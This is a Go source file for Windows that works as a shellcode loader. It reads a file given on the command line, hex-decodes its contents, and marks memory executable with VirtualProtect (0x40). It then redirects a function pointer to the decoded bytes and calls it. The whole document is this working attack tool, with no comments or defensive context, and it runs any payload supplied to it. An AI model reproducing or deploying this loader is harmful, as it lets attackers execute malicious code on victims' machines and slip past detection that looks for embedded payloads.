package main

import (
	"encoding/hex"
	"os"
	"syscall"
	"unsafe"
)
var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
	uintptr(lpAddress),
	uintptr(dwSize),
	uintptr(flNewProtect),
	uintptr(lpflOldProtect))
	return ret > 0
}
func Run(sc []byte) {
	f:= func() {}
	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Call to VirtualProtect failed!")
	}
	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))

	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Call to VirtualProtect failed!")
	}
	f()
}
func readFile(name string)  {
	a:=make([]byte,2048)
	f,err:=os.OpenFile(name,os.O_RDONLY,0666)
	if err!=nil{
		return
	}
	_,_=f.Read(a)
	t,_:=hex.DecodeString(string(a))
	Run(t)
}
func main() {
	if len(os.Args)==2{
		t:=os.Args[1]
		readFile(t)
	}
}
